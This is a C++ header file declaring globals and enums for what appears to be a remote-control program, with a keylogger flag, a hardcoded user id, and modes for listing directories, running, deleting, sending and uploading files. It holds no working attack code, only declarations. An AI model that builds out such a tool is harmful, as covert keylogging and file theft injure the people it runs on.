#ifndef GLOBALS_H
#define GLOBALS_H

#include <iostream>

extern const std::wstring scrname;
extern const char* filename;
extern const char* cdfilename;
extern bool isKeyLoggerRunning;
extern bool isConversationRunning;
extern const int64_t sashaId;

enum class Mode {
	STANDARD,
	CHECK_DIR,
	FULL_CHECK_DIR,
	START_FILE,
	DELETE_FILE,
	COPY_FILE,
	SEND_FILE,
	UPLOAD_FILE,
	CONVERSATION,
	PLAY_MUSIC,
};

enum class COE {
	Success,
	EmptyInput,
	EmptyDirectory,
	PathNotFound,
	NotADirectory,
	ConversionError,
	FilesystemError,
	UnexpectedError,
	ExecutionError,
	UnknownError,
	OpenFileError,
	LimitError,
	NotARegularFile,
	RemoveFileError,
	NotAFile
};

enum class ResponseType {
	Text,
	Path,
	None
};

// If code == Success -> returning target information to handleResult() (text or path to file)
// Else -> returning code + errorDetails to handleResult()
struct Result {
	COE code;						// Function's code of end
	std::string errorDetails;		// Details of error (if there is)
	ResponseType response_type;		// Type of response
	std::string response;			// Target response
};

extern Mode currentMode;
extern bool isWaitingForFile;
extern bool isMusicPlaying;

#endif